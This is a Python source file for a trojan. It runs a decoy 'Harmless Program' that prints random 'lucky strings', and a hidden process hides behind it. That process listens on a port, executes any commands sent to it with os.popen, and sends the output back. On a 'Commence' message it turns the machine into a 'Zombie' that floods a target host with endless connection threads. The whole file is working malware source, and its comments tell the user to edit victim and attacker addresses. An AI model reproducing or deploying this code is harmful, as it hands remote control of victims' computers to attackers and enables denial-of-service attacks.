# This program runs a normal looking program in front and tries to connect to attacker at back. 
# Therefore the "harmless" and "secret" parts.

import threading
from multiprocessing import Process
import time
import string
import os
import socket 
import random 

# Edit these values
# SRC = victim
# TARGET = attacker

SRC_IP = "192.168.1.4" 
SRC_PORT = 7777
TARGET_IP = "192.168.1.5"
TARGET_PORT = 4000 

count = 0

class multithread(threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
            s.connect((TARGET_IP, TARGET_PORT))
        except:
            print("Exception occured, timeout...") # This message is not needed, this is displayed on screen of victim just for demonstration.
            
# You can use something like calculator program here or something even better
def normal():
    print("\n")
    print("#"*12+" Welcome to Harmless Program "+"#"*12)
    print('\n')
    print("YOUR LUCKY STRING ==> KIlOpuHjEr")
    print("If you find it within 5 minutes, your day will be lucky!")
    print('\n')
    print("This is talkative program and will keep printing random text unless stopped with Ctrl+C...")
    while True:
        ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 10)) 
        print('\n')
        print("="*15)
        print("Your String ==> "+ran)
        print("Sleeping for 3 seconds am tired...")
        time.sleep(3)     
        print("You are quite unlucky if you still didn't find your string!")

def attack():
    count = 0
    while 1:
        # Create new threads
        multithread(count, "Thread-{}".format(count), count).start()
        count = count+1
        # print("Attacked!")

def secret():
    HOST = SRC_IP
    PORT = SRC_PORT
    flag = 1
    
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((HOST, PORT))
            s.listen()
            conn, addr = s.accept()
            with conn:
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    elif "Command" in repr(data):
                        cmd = repr(data)
                        start = cmd.find("#")+1
                        end = cmd.find("$")
                        stream = os.popen(cmd[start:end])
                        output = ""
                        output = stream.read()
                        if "not recognized" in output:
                            conn.sendall("Command not found..".encode('utf-8'))
                            s.close()
                        elif output == "":
                            conn.sendall("Command successful but returned no output.".encode('utf-8'))
                            s.close()
                        else:
                            conn.sendall(output.encode('utf-8'))        
                            s.close() 
                    elif "Commence" in repr(data):
                        conn.sendall('The Zombie has initiated the attack and will be disconnected!'.encode('utf-8'))
                        s.close()
                        attack()
                    elif "Check" in repr(data):
                        conn.sendall('The Zombie is Up and listening...'.encode('utf-8'))
                        s.close()
                    else:
                        pass
        s.close()

if __name__=='__main__':     
    p1 = Process(target = normal)
    p1.start()
    p2 = Process(target = secret)
    p2.start()
